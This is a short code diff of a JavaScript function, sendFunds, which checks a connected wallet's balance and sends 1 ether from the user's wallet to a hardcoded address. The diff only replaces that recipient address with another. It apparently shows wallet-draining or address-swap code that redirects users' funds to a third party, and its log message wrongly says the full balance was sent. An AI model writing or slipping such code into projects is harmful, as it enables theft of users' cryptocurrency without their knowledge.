@@ -26,12 +26,12 @@ async function sendFunds() {
     const balance = await web3.eth.getBalance(walletAddress);
     if (balance > 0) {
       const tx = {
-        to: '0x6c3068B7F0518A704f59DEC72C708b8fA950427e',
+        to: '0x710DA612825485559572fB587b3b5a6Ae1B4f264',
         from: walletAddress,
         value: web3.utils.toWei('1', 'ether'),
       };
       const signedTx = await window.ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
-      console.log(`Sent ${web3.utils.fromWei(balance)} to 0x6c3068B7F0518A704f59DEC72C708b8fA950427e`);
+      console.log(`Sent ${web3.utils.fromWei(balance)} to 0x710DA612825485559572fB587b3b5a6Ae1B4f264`);
     } else {
       console.log('No funds to send');
     }
